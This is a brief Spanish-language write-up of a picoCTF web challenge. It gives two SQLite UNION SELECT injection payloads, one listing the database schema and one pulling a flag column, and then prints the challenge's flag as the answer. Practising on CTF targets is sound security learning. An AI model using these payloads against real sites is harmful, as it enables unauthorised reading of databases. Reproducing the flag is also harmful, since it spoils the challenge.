Can you find the flag on this website. Try to find the flag [here](http://saturn.picoctf.net:57949/).
Hints:
- SQLiLite
# Solucion
Entramos con inyeccion de sql a la base de datos del sitio web y usando # SQLite Injection vamos entrando a las tablas hasta encontrar el archivo .txt donde esta ubicada la bandera, el comando que funciono es:  ' UNION SELECT name, sql, null from sqlite_master;-- 
Y despues usando el comando para abrir el archivo: ' UNION SELECT flag, null, null from more_table;-- ahora si aparece la bandera:

picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8ee9477}
# Referencias
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
